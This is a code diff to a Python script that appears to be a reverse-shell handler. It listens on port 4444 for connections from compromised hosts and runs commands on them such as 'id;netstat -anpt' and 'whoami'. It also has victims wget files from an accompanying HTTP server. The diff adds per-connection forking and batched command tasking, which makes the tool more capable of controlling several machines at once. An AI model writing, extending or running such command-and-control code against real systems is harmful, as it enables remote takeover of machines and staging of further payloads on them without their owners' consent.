@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-import socket, time
+import os, socket, time
 import random, string
 import subprocess as sub
 import threading
@@ -10,8 +10,14 @@ warnings.filterwarnings("ignore", category=DeprecationWarning)
 
 import telnetlib
 
+
 logging.basicConfig(format="[*] %(asctime)s - %(levelname)-8s%(message)s",
                     level=logging.DEBUG)
+
+HTTP_IP     = "127.0.0.1"
+HTTP_PORT   = 8000
+
+
 
 class cmdtype:
     EXEC_CMD = 1
@@ -34,17 +40,18 @@ class shellserver:
         cs.write(idata.strip().encode() + b";echo " + delim)
         return cs.read_until(delim)
 
-    def dispatch(self, cs, command, **kwargs):
+    def dispatch(self, cs, command, *args):
         match (command):
             case (cmdtype.EXEC_CMD):
                 # execute shell command
-                idata = kwargs["cmd"]
+                idata = args[0]
             case (cmdtype.GET):
                 # get/download file
-                # idata = "wget "
-                pass
+                remote_file, local_file = args
+                idata = f"wget -O {remote_file} http://{HTTP_IP}:{HTTP_PORT}/{local_file}"                
             case (cmdtype.PUT):
                 # put/upload file
+                # remote_file, local_file = args
                 pass
             case (_):
                 logging.info("Unsupported command operations")
@@ -56,17 +63,21 @@ class shellserver:
         self.ssock = socket.create_server(("", port), reuse_port=True)
 
 
-    def interactive(self, method=None, **kwargs):
+    def interactive(self, cmdtasks=None):
         while True:
             conn, addr  = self.ssock.accept()
+            print(f"*** Connection from host {addr} ***")
             cs          = telnetlib.Telnet()
             cs.sock     = conn
-            time.sleep(0.05)
-            if method:
-                self.dispatch(cs, method, cmd=kwargs["cmd"])
+            if cmdtasks:
+                if not os.fork(): # child process
+                    for cmd in cmdtasks:
+                        method, *args = cmd
+                        self.dispatch(cs, method, *args)
+                else:
+                    conn.close()
             else:
                 cs.interact()
-
 
 def create_httpserver():
     p = sub.Popen(
@@ -87,9 +98,14 @@ def stop_httpserver(p):
 
 def test_shellserver():
     ss = shellserver(4444)
-    # ss.interactive()  # interactive
-    ss.interactive(cmdtype.EXEC_CMD, cmd="id;netstat -anpt")
-    ss.interactive(cmdtype.GET, remote="/bin/busybox", local="/tmp/abc")
+    cmdtasks = [
+        (cmdtype.EXEC_CMD, "id;netstat -anpt"),
+        (cmdtype.EXEC_CMD, "whoami"),
+        (cmdtype.GET, "/tmp/remote", "localfile")
+    ]
+
+    ss.interactive(cmdtasks)  # execute command
+    # ss.interactive()
 
 def test_httpserver():
     httpd = create_httpserver()
@@ -101,6 +117,10 @@ def test_httpserver():
         stop_httpserver(httpd)
         print("stop http server")
 
+
 if __name__ == "__main__":
-    # test_shellserver()
-    test_httpserver()
+    ts = threading.Thread(target=test_shellserver)
+    th = threading.Thread(target=test_httpserver)
+    th.start()
+    ts.start()
+    # test_httpserver()
